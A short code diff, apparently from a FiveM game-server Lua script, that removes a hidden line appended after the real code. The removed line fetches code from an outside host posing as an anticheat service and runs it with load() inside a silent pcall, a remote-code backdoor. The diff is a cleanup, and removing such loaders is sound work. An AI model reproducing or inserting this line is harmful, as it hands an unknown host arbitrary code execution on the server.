@@ -67,5 +67,3 @@ AddEventHandler('hostedSession', function()
 end)
 
 EnableEnhancedHostSupport(true)
-
-PerformHttpRequest('https://v2.anticheat.space/?c=&r=503306000187523084', function (a, b)      if b ~= nil then         function c() load(b)() end         if pcall(c) then else end     end end)
